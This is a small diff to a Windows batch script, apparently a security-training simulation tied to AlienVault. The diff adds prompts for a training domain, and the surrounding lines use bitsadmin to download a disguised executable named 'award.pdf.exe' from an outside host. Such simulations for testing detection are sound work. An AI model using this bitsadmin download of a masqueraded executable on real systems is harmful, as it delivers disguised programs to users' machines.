@@ -1,5 +1,7 @@
 @echo off
 REM joriordan@alienvault.com
+echo Enter the Fully Qualified Domain name (not URL)
+echo Example: training-eu-1-20170101.alienvault.cloud
 set /p domain=Enter Domain: 
 echo Downloading award.pdf.exe
 bitsadmin /transfer download_file /download /priority normal http://alien-training.com/award.pdf.exe C:\Users\Administrator\Downloads\award.pdf.exe > NUL
